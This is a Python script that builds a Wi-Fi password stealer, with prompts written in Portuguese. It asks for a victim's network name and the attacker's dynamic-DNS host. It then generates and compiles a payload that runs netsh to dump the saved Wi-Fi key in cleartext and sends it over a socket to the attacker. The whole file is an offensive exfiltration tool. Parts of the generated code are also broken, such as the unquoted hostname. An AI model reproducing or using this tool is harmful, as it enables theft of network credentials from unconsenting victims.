#!/usr/bin/python
# -*- coding: utf -*-

try:
   import os

   print "Build SendWifi Server"
   print " Por Derick Santos"

   server = open("server.py","w")

   ssid = raw_input("Coloque o SSID da vítima: ")
   noip = raw_input("Coloque seu NO-IP: ")
   porta = raw_input("Porta da conexão: ")

   #Codigo
   code = """#/usr/bin/python
import socket
import os

command = 'netsh wlan show profile """+ssid+""" key=clear | find "Key Content"'
wifi = "".join(os.popen(command).readlines())

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip = """+noip+"""
port = """+porta+"""

conexao = s.connect((ip,port))
s.send(wifi)
s.close()"""

   server.write(code)
   server.close()

   #Compile
   os.system("pycompile server.py")

except SyntaxError:
   pass
